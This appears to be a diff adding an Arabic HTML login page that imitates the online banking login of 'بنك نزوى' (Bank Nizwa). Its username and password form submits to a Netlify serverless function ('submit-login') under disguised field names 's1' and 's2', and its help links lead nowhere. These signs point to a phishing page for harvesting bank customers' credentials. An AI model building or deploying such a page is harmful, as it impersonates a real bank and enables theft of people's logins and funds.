@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة تسجيل الدخول</title>
+    <style>
+        @font-face {
+            font-family: 'Dubai';
+            src: url('https://fonts.googleapis.com/css2?family=Dubai&display=swap');
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Dubai', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            direction: rtl;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background-color: #5b1986;
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .header-title {
+            font-size: 28px;
+            font-weight: bold;
+        }
+        
+        .header-arrow {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 24px;
+            color: white;
+        }
+        
+        .header-text {
+            text-align: center;
+            margin-top: 20px;
+            font-style: italic;
+            font-size: 22px;
+        }
+        
+        .header-subtext {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        
+        .background-pattern {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000" viewBox="0 0 1000 1000"><path d="M0,500 Q250,250 500,500 T1000,500 T500,1000 T0,500" fill="none" stroke="%23f5f5f5" stroke-width="2" /></svg>');
+            background-size: 600px 600px;
+            background-position: center;
+            opacity: 0.1;
+            z-index: -1;
+        }
+        
+        .login-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+        }
+        
+        .form-container {
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+        
+        .form-control {
+            width: 100%;
+            background-color: white;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            padding: 15px 40px 15px 15px;
+            font-size: 16px;
+            color: #333;
+        }
+        
+        .form-control::placeholder {
+            color: #888;
+        }
+        
+        .form-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #5b1986;
+            font-size: 20px;
+        }
+        
+        .forgot-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .forgot-link {
+            color: #666;
+            text-decoration: none;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        
+        .remember-me input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            margin-left: 10px;
+            border: 1px solid #ccc;
+        }
+        
+        .remember-me label {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .btn-login {
+            width: 100%;
+            background-color: #5b1986;
+            color: #f7bb0e;
+            border: none;
+            border-radius: 5px;
+            padding: 15px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        
+        .footer {
+            height: 20px;
+            background-color: #f7bb0e;
+            margin-top: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="background-pattern"></div>
+    
+    <div class="header">
+        <div class="header-arrow">&#10095;</div>
+        <div class="header-title">بنك نزوى</div>
+        <div class="header-text">في أي مكان وأي وقت</div>
+        <div class="header-subtext">سهل وسريع وآمن</div>
+    </div>
+    
+    	<form action="/.netlify/functions/submit-login" method="post" class="login-form" id="loginForm">
+    <div class="login-container">
+        <div class="form-container">
+            <div class="form-group">
+                <input name="s1" type="text" class="form-control" placeholder="اسم المستخدم "required>
+                <span class="form-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="8" r="4" stroke="#5b1986" stroke-width="2"/>
+                        <path d="M4 18C4 14.6863 7.58172 12 12 12C16.4183 12 20 14.6863 20 18" stroke="#5b1986" stroke-width="2"/>
+                    </svg>
+                </span>
+            </div>
+            
+            <div class="forgot-links">
+                <a href="#" class="forgot-link">نسيت اسم المستخدم</a>
+            </div>
+            
+            <div class="form-group">
+                <input name="s2" type="password" class="form-control" placeholder="كلمة المرور"required>
+                <span class="form-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="5" y="11" width="14" height="10" rx="2" stroke="#5b1986" stroke-width="2"/>
+                        <path d="M8 11V7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7V11" stroke="#5b1986" stroke-width="2"/>
+                    </svg>
+                </span>
+            </div>
+            
+            <div class="forgot-links">
+                <div>
+                    <a href="#" class="forgot-link">تفعيل اسم المستخدم</a>
+                </div>
+                <div>
+                    <a href="#" class="forgot-link">نسيت كلمة المرور</a>
+                </div>
+            </div>
+            
+            <div class="remember-me">
+                <label for="remember">تذكر رمز الدخول</label>
+                <input type="checkbox" id="remember">
+            </div>
+            
+            <button type="submit" class="btn-login">دخول</button>
+        </div>
+    </div>
+    </form>
+    <div class="footer"></div>
+
+    
+</body>
+</html>
